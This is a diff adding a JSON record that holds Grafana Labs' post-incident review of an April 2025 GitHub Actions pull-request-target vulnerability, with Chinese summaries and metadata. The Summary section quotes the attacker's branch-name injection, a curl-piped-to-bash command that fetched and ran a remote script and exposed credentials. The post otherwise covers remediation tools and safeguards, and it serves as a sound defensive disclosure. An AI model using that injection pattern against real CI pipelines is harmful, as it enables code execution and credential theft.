@@ -1,0 +1,59 @@
+{
+  "id": "RAW_d8f987",
+  "title": "Grafana：GitHub 工作流漏洞事后审查与安全改进",
+  "url": "https://grafana.com/blog/2025/05/15/grafana-security-update-post-incident-review-for-github-workflow-vulnerability-and-whats-next/",
+  "date": "2025-06-20 04:27:45",
+  "author": "Joe McManus",
+  "siteName": "Grafana Labs",
+  "content": "<html>\n <head></head>\n <body>\n  <p>On April 26, 2025, we had a security incident via an insecure GitHub Action, as covered in our <a href=\"https://grafana.com/blog/2025/04/27/grafana-security-update-no-customer-impact-from-github-workflow-vulnerability/\">previous blog post</a>.&nbsp;</p>\n  <p>The good news is our investigation wrapped up May 12, 2025, and <strong>we have confirmed that there has been no code modification, unauthorized access to production systems, exposure of customer data, or access to personal information.</strong>&nbsp;</p>\n  <p>This blog post will cover what happened, how it started, how we looked into it, and the fixes we’re putting in place to prevent it from happening again.</p>\n  <h2 id=\"summary\">Summary</h2>\n  <p>A vulnerable GitHub Action, utilizing <code>pull-request-target</code> instead of the safer <code>pull-request</code>, led to a security incident. This allowed an unauthorized user to execute code from a malicious branch within a trusted environment. By naming their branch to trigger a command (essentially using <code>('child_process').exec('curl$(IFS)-pathtofile$(IFS)bash'</code>) the attacker was able to run a remote script. This script then exposed environment variables, including credentials, within the trusted environment.</p>\n  <p>To prevent such incidents in the future, we have required that <a href=\"https://github.com/AdnaneKhan/Gato-X\" target=\"_blank\" rel=\"noopener noreferrer\">Gato-X</a>, an open source tool by Adnane Khan that identifies insecure GitHub Actions, is run on all our actions. We are so impressed with Gato-X that we are collaborating with Adnane Khan and Grafana Labs will be sponsoring the project to support the wider community.</p>\n  <p>To improve code quality, we’ve integrated <a href=\"https://github.com/zizmorcore/zizmor\" target=\"_blank\" rel=\"noopener noreferrer\">Zizmor</a>, an open source static analysis tool by William Woodruff, as a mandatory step in our CI/CD pipelines. Recognizing its value to the open source community, we are also partnering with William Woodruff as a sponsor of the Zizmor project.</p>\n  <h2 id=\"impact-and-remediation\">Impact and remediation</h2>\n  <p>Let’s break down the impact and remediation of this incident by focusing on the CIA triad, a common model for informing policies in information security based on <strong>confidentiality</strong>, <strong>integrity</strong>, and <strong>availability</strong>.</p>\n  <h3 id=\"confidentiality\">Confidentiality</h3>\n  <p>Our investigation confirmed that the incident did not impact the confidentiality of our production systems or code. Given our open source DNA, most of our code is inherently public. The compromised workflow exposed some credentials and a tools repository. Before restoring production, we used <a href=\"https://github.com/trufflesecurity/trufflehog\" target=\"_blank\" rel=\"noopener noreferrer\">TruffleHog</a>, an open source credential scanner, across all repositories to ensure no credentials remained in the code. TruffleHog is now a mandatory step in our CI/CD pipelines. The exposed credentials were confirmed to be inactive and would have required further access to exploit. To enhance security, we’ve implemented compartmentalized vaults and short-lived tokens, reducing the potential impact of any future credential leaks.</p>\n  <h3 id=\"integrity\">Integrity</h3>\n  <p>During the incident, Grafana Labs maintained complete data integrity. A comprehensive audit of every commit across all of Grafana Labs’ public and private repositories, before and after the unauthorized access, was conducted to confirm this. Subsequently, every GitHub Action was audited. The authenticity of each container within our infrastructure was then verified. Leveraging our Infrastructure as Code (IaC) setup and extensive instrumentation, we confirmed that no running instance had been compromised.</p>\n  <h3 id=\"availability\">Availability</h3>\n  <p>Our quick response to this type of attack prevented any impact on the availability of our production services. One of the steps we took during the incident response was to pause all deployments during the incident.</p>\n  <p>Interestingly, Grafana Labs embraces Everything as Code (EaC) to such an extent that even our website is managed as code. As a result, the initial blog post about this incident was delayed due to the deployment freeze. (The blog was manually posted on April 27.) Automation was restored after all credentials were rotated and our new security tools—Zizmor, Trufflehog, and Gato-X—were executed on our systems.</p>\n  <h2 id=\"analysis\">Analysis</h2>\n  <p>Grafana Labs used <a href=\"https://github.com/grafana/loki\" target=\"_blank\" rel=\"noopener noreferrer\">Grafana Loki</a>, our open source platform for log aggregation, to analyze potential unauthorized user actions, specifically examining code commits, dangling commits, Github Actions, credential access in Vault, authentication attempts, container authenticity, production access, data access, and production configuration changes. This comprehensive analysis confirmed that no critical systems were compromised or impaired as a result of the attack.</p>\n  <h3 id=\"what-went-well\">What went well&nbsp;</h3>\n  <p>We are proud that our proactive security measures were activated as planned. Our canary tokens alerted us when their use had been attempted. We also have a fantastic staff at Grafana Labs who responded quickly over the weekend. Because Grafana Labs has a globally distributed workforce, we had engineers who were awake and jumped on our alerts almost immediately, and we were able to coordinate work across teams and time zones. We acted decisively and shut down credentials, access, actions, and automations.&nbsp;</p>\n  <p>As an open source company, we wanted to be transparent about the event and quickly shared all the details we had about the incident as soon as possible <a href=\"https://www.linkedin.com/feed/update/urn:li:activity:7322354927857471488\" target=\"_blank\" rel=\"noopener noreferrer\">across our social channels</a> and on our blog.&nbsp;</p>\n  <h3 id=\"what-we-improved\">What we improved</h3>\n  <p>In response to this recent incident, Grafana Labs is accelerating its security roadmap with several key initiatives. These include the implementation of tools such as Zizmor, Trufflehog, and Gato-X.&nbsp;</p>\n  <p>Ongoing efforts involve deploying Semgrep across all repositories, enhancing security through compartmentalization and privilege separation by migrating credentials to dedicated vaults, separating the open source GitHub organization from private repositories, and restricting token privileges.&nbsp;</p>\n  <p>Furthermore, Grafana Labs is actively expanding its use of canary tokens and enhancing its alerting capabilities.&nbsp;</p>\n  <p>This is just a sampling of what we are doing, and we hope our openness about this incident and our response can help others.&nbsp;</p>\n  <h2 id=\"reporting-security-issues\">Reporting security issues</h2>\n  <p>If you think you have found a security vulnerability, please go to our <a href=\"https://grafana.com/legal/report-a-security-issue/?pg=blog&amp;plcmt=body-txt\">Report a security issue page</a> to learn how to send a security report.</p>\n  <p>Grafana Labs will send you a response indicating the next steps in handling your report. After the initial reply to your report, the security team will keep you informed of the progress towards a fix and full announcement, and may ask for additional information or guidance.</p>\n  <p><em>Important: We ask you to not disclose the vulnerability before it has been fixed and announced, unless you received a response from the Grafana Labs security team that you can do so.</em></p>\n  <h2 id=\"security-announcements\">Security announcements</h2>\n  <p>We maintain a <a href=\"https://grafana.com/tags/security/?pg=blog&amp;plcmt=body-txt\">security category</a> on our blog, where we will always post a summary, remediation, and mitigation details for any patch containing security fixes. You can also subscribe to our <a href=\"https://grafana.com/tags/security/index.xml\">RSS feed</a>.</p>\n </body>\n</html>",
+  "aiSummary": "Grafana 对 GitHub 工作流漏洞进行审查，并已实施安全增强措施。",
+  "oneSentenceSummary": "Grafana 对 GitHub 工作流漏洞进行审查，并已实施安全增强措施。",
+  "summary": "本文详细介绍了 Grafana Labs 对一起安全漏洞的事后审查。该漏洞源于不安全的 GitHub Action，利用了 `pull-request-target`（目标拉取请求）。它允许从受信任环境中的恶意分支执行代码，从而暴露包括凭证在内的环境变量。通过 CIA triad（保密性、完整性和可用性）框架分析影响，调查确认没有生产系统受到入侵，没有代码修改，也没有客户数据暴露。作为回应，Grafana 将 Gato-X、Zizmor 和 TruffleHog 等开源工具集成到 CI/CD 流水线中。此外，还通过隔离式 Vault 和短期令牌增强了凭证管理，并增加了金丝雀令牌（一种预先部署的诱饵，用于检测未授权访问）的使用。本文强调了事件的透明度以及从中吸取的教训。",
+  "mainPoints": [
+    {
+      "point": "不安全的 GitHub Action (使用了 `pull-request-target`) 导致代码执行漏洞。",
+      "explanation": "使用 `pull-request-target`（目标拉取请求）而不是 `pull-request`（拉取请求）允许从受信任的工作流环境中的分支执行恶意代码。"
+    },
+    {
+      "point": "没有生产系统或客户数据受到入侵。",
+      "explanation": "尽管凭证暴露，但调查确认没有未经授权访问生产系统，没有代码修改，也没有客户数据暴露，保证了 CIA 三元组的完整性。"
+    },
+    {
+      "point": "新的安全工具集成到 CI/CD 流水线中。",
+      "explanation": "Gato-X、Zizmor 和 TruffleHog 现在是 CI/CD 流水线中的强制步骤，用于检测不安全的操作、静态分析代码并扫描凭证。"
+    },
+    {
+      "point": "凭证管理通过隔离式 Vault 和短期令牌得到增强，警报系统也进行了优化。",
+      "explanation": "实施了隔离式 Vault、短期令牌并增加了金丝雀令牌的使用，以减轻未来凭证暴露的风险。"
+    }
+  ],
+  "keyQuotes": [
+    "我们已经确认，没有发生代码修改，没有未经授权访问生产系统，没有客户数据暴露，也没有个人信息访问。",
+    "一个利用 `pull-request-target`（目标拉取请求）而不是更安全的 `pull-request`（拉取请求）的脆弱 GitHub Action 导致了一起安全事件。",
+    "为了防止将来发生此类事件，我们要求在所有操作中运行开源工具 Gato-X...",
+    "我们为我们的主动安全措施按计划启动而感到自豪。我们的金丝雀令牌在尝试使用它们时提醒了我们。",
+    "作为一家开源公司，我们希望对事件保持透明，并尽快分享我们掌握的关于该事件的所有细节..."
+  ],
+  "tags": [
+    "安全",
+    "漏洞",
+    "事件响应",
+    "DevSecOps",
+    "GitHub Actions"
+  ],
+  "topicTag": "devops",
+  "readTime": 4,
+  "score": 89,
+  "wordCount": 997,
+  "domain": "grafana.com",
+  "category": "Programming_Technology",
+  "aiSubCategory": "NEWS",
+  "mainDomain": "Programming_Technology",
+  "sourceId": "SOURCE_c68a52",
+  "sourceName": "Grafana Labs",
+  "resourceType": "ARTICLE",
+  "language": "en_US",
+  "publishTimeStamp": 1750393665000,
+  "publishDateStr": "2025-06-20",
+  "publishDateTimeStr": "2025-06-20 04:27:45"
+}
